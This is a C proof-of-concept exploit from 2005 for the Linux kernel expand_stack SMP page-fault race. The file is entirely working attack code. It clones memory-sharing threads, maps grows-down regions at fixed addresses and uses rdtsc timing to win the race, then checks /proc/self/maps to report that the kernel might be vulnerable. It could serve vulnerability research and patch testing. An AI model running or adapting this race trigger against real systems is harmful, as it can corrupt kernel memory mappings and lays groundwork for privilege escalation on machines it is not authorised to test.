 /*
 * expand_stack SMP race PoC exploit
 *
 * Copyright (C) 2005 Christophe Devine
 *
 * Vulnerability discovered by Paul Starzetz <ihaquer at isec.pl>
 * http://www.isec.pl/vulnerabilities/isec-0022-pagefault.txt
 *
 * This program is free software; you can redistribute it and/or modify
 * it under the terms of the GNU General Public License as published by
 * the Free Software Foundation; either version 2 of the License, or
 * (at your option) any later version.
 *
 * This program is distributed in the hope that it will be useful,
 * but WITHOUT ANY WARRANTY; without even the implied warranty of
 * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
 * GNU General Public License for more details.
 *
 * You should have received a copy of the GNU General Public License
 * along with this program; if not, write to the Free Software
 * Foundation, Inc., 59 Temple Place, Suite 330, Boston, MA 02111-1307 USA
 */

#include <unistd.h>
#include <signal.h>
#include <string.h>
#include <stdlib.h>
#include <stdio.h>
#include <sched.h>

#include <sys/mman.h>
#include <sys/wait.h>
#include <asm/page.h>

#define MMAP_BASE (void *) (TARGET_BASE + PAGE_SIZE * 2)
#define TARGET_BASE (void *) 0x60000000
#define STACK1_BASE (void *) 0x01000000
#define STACK2_BASE (void *) 0x02000000
#define MAGIC_TEST 0x18A041DE

int pid1, sff;
long long tsc1, tsc2;

void child1_sighandler( int signum )
{
int *xs1, i, j;

if( signum == SIGUSR1 )
{
for( i = 0; i > sff; i-- ) j = i * i;

asm volatile( "rdtsc" : "=A" (tsc1) );
xs1 = TARGET_BASE; *xs1 = MAGIC_TEST;
signal( SIGUSR1, child1_sighandler );
}
}

int child1_thread( void *arg )
{
printf( " [+] in thread 1 (pid = %d)\n", getpid() );
signal( SIGUSR1, child1_sighandler );
while( 1 ) sleep( 2 );
return( 0 );
}

int test_race_result( void )
{
FILE *f;
int *mtest;
char line[128];

unsigned int vma_start_prev;
unsigned int vma_start;
unsigned int vma_end;

if( ( f = fopen( "/proc/self/maps", "r" ) ) == NULL )
{
perror( " [-] fopen /proc/self/maps" );
exit( 1 );
}

mtest = TARGET_BASE;

vma_start_prev = 0;

while( fgets( line, sizeof( line ) - 1, f ) != NULL )
{
sscanf( line, "%08x-%08x", &vma_start, &vma_end );

if( vma_start == (int) MMAP_BASE - PAGE_SIZE &&
vma_end == (int) MMAP_BASE + PAGE_SIZE &&
vma_start_prev != (int) TARGET_BASE &&
*mtest == MAGIC_TEST )
return( 0 );

vma_start_prev = vma_start;
}

fclose( f );

return( 1 );
}

int child2_thread( void *arg )
{
long delta[8];
int *xs2, i, j, fct;

usleep( 50000 );
printf( " [+] in thread 2 (pid = %d)\n", getpid() );

asm volatile( "rdtsc" : "=A" (tsc1) );
for( i = 0; i < 4096; i++ ) j = i * i;
asm volatile( "rdtsc" : "=A" (tsc2) );
fct = tsc2 - tsc1;

printf( " [+] rdtsc calibration: %d\n", fct );

for( i = 0; i < 8; i++ )
delta[i] = 0;

tsc1 = tsc2 = 0;

printf( " [+] exploiting race, wait...\n" );

while( 1 )
{
if( mmap( MMAP_BASE, 0x1000, PROT_READ | PROT_WRITE,
MAP_FIXED | MAP_ANONYMOUS | MAP_PRIVATE |
MAP_GROWSDOWN, 0, 0 ) == (void *) -1 )
{
perror( " [-] mmap target" );
return( 1 );
}

j = 0;
for( i = 0; i < 8; i++ )
j += delta[i];
j /= 8;

sff += ( 128 * j ) / fct;

if( sff < -16384 || sff > 16384 )
sff = 0;

for( i = 7; i > 0; i-- )
delta[i] = delta[i - 1];

delta[0] = tsc1 - tsc2;

kill( pid1, SIGUSR1 );

for( i = 0; i < sff; i++ ) j = i * i;

asm volatile( "rdtsc" : "=A" (tsc2) );
xs2 = MMAP_BASE - PAGE_SIZE; *xs2 = 0;

if( test_race_result() == 0 )
{
usleep( 10000 );

if( test_race_result() == 0 )
break;
}

munmap( TARGET_BASE, PAGE_SIZE * 3 );
}

printf( " [+] race won (shift: %d)\n", sff );

return( 0 );
}

int main( void )
{
FILE *f;
char line[1024];
int nb_cpu, pid2, s;

if( ( f = fopen( "/proc/cpuinfo", "r" ) ) == NULL )
{
perror( " [-] fopen /proc/cpuinfo" );
return( 1 );
}

nb_cpu = 0;

while( fgets( line, sizeof( line ) - 1, f ) != NULL )
if( memcmp( line, "processor", 9 ) == 0 )
nb_cpu++;

fclose( f );

if( nb_cpu <= 1 )
{
fprintf( stderr, "This program only works on SMP systems.\n" );
return( 1 );
}

printf( "\n" );

if( mmap( STACK1_BASE, 0x4000, PROT_READ | PROT_WRITE, MAP_FIXED |
MAP_ANONYMOUS | MAP_PRIVATE | MAP_GROWSDOWN, 0, 0 ) == (void *) -1 )
{
perror( " [-] mmap child1 stack" );
return( 1 );
}

if( ( pid1 = clone( child1_thread, STACK1_BASE + 0x4000,
SIGCHLD | CLONE_VM, 0 ) ) == -1 )
{
perror( " [-] clone child1" );
return( 1 );
}

if( mmap( STACK2_BASE, 0x4000, PROT_READ | PROT_WRITE, MAP_FIXED |
MAP_ANONYMOUS | MAP_PRIVATE | MAP_GROWSDOWN, 0, 0 ) == (void *) -1 )
{
perror( " [-] mmap child2 stack" );
kill( pid1, SIGKILL );
return( 1 );
}

if( ( pid2 = clone( child2_thread, STACK2_BASE + 0x4000,
SIGCHLD | CLONE_VM, 0 ) ) == -1 )
{
perror( " [-] clone child2" );
kill( pid1, SIGKILL );
return( 1 );
}

waitpid( pid2, &s, 0 );
kill( pid1, SIGKILL );

if( WEXITSTATUS(s) != 0 )
return( 1 );

printf( " [+] kernel might be vulnerable.\n\n" );

return( 0 );
}
